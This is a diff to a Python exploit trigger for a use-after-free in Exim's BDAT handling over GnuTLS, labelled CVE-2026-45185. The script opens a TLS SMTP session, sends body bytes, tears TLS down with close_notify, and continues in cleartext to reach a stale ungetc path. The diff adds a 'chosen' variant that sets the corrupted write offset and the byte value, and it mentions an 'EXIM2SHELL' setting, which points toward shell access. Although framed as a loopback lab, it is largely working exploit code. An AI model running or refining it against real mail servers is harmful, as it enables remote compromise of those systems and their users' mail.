@@ -1,20 +1,23 @@
 #!/usr/bin/env python3
 """Loopback-only Exim BDAT/GnuTLS close_notify trigger (CVE-2026-45185 lab).
 
-Usage: python3 trigger.py PORT [VARIANT]
+Usage: python3 trigger.py PORT [VARIANT] [N] [CH]
 Variants:
-  ungetc   - BDAT 5 with 1 TLS body byte, close_notify, then cleartext
-             completing the chunk plus a CRLF header and a bare-LF header
-             (drives receive_ungetc(' ') through the stale bdat/tls layer).
-  cmd      - same but cleartext is an SMTP command line.
+  ungetc/two/three/four - wake-1/wake-2 variants
+  chosen  - BDAT 100 LAST with N TLS body bytes (controls write offset N-1),
+            close_notify, cleartext completion, then a DATA message whose
+            second header starts with CH (controls the unget byte value).
 """
 import socket
 import ssl
 import sys
+import os
 import time
 
 PORT = int(sys.argv[1])
 VARIANT = sys.argv[2] if len(sys.argv) > 2 else "ungetc"
+N = int(sys.argv[3]) if len(sys.argv) > 3 else 1
+CH = sys.argv[4] if len(sys.argv) > 4 else "Z"
 
 
 def read_reply(s):
@@ -26,7 +29,6 @@ def read_reply(s):
         data += line
         if b"\r\n" in data and (len(data) >= 4):
             lines = data.split(b"\r\n")
-            # multiline: last line starts with digit + space or '-' final
             last = [x for x in lines if x][-1]
             if len(last) >= 4 and last[3:4] == b" ":
                 break
@@ -50,6 +52,8 @@ def main():
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
+    if os.environ.get("EXIM2SHELL_TLS12"):
+        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
     tls = ctx.wrap_socket(raw, server_hostname="localhost")
     tls.do_handshake()
     print("TLS:", tls.version(), tls.cipher()[0])
@@ -57,10 +61,11 @@ def main():
     send_cmd(tls, b"MAIL FROM:<a@localhost>")
     send_cmd(tls, b"RCPT TO:<a@localhost>")
     bdat_cmd = (b"BDAT 100" if VARIANT == "four"
+                else b"BDAT %d LAST" % (N + 1) if VARIANT == "chosen"
                 else b"BDAT 2 LAST" if VARIANT in ("two", "three")
                 else b"BDAT 5")
     send_cmd(tls, bdat_cmd, want=False)
-    tls.sendall(b"A")       # 1 of n body bytes inside TLS
+    tls.sendall(b"A" * (N if VARIANT == "chosen" else 1))
     tls.settimeout(1.0)
     try:
         clear = tls.unwrap()    # sends TLS close_notify, returns raw socket
@@ -71,9 +76,19 @@ def main():
         clear = socket.socket(fileno=fd)
         print("unwrap timed out; continuing on detached fd", fd)
     clear.settimeout(10)
-    if VARIANT == "four":
-        # chunk still active: bare-LF header drives bdat_ungetc ->
-        # stale lwr_receive_ungetc (tls_ungetc) after the free
+    if VARIANT == "chosen":
+        clear.sendall(b"BBDAT 0 LAST\r\n")
+        time.sleep(1.0)
+        try:
+            print("term reply:", clear.recv(4096)[:300])
+        except Exception as e:
+            print("term recv:", repr(e))
+        send_cmd(clear, b"MAIL FROM:<b@localhost>")
+        send_cmd(clear, b"RCPT TO:<b@localhost>")
+        send_cmd(clear, b"DATA")
+        clear.sendall(b"A: 1\r\n" + CH.encode() + b": 2\r\nC: 3\n.\r\n")
+        time.sleep(1.0)
+    elif VARIANT == "four":
         clear.sendall(b"A: 1\r\nB: 2\n")
         time.sleep(1.0)
     elif VARIANT == "three":
@@ -89,7 +104,7 @@ def main():
         clear.sendall(b"A: 1\r\nB: 2\r\nC: 3\n.\r\n")
         time.sleep(1.0)
     elif VARIANT == "two":
-        clear.sendall(b"B")     # complete the BDAT LAST chunk
+        clear.sendall(b"B")
         time.sleep(0.5)
         send_cmd(clear, b"RSET")
         send_cmd(clear, b"MAIL FROM:<b@localhost>")
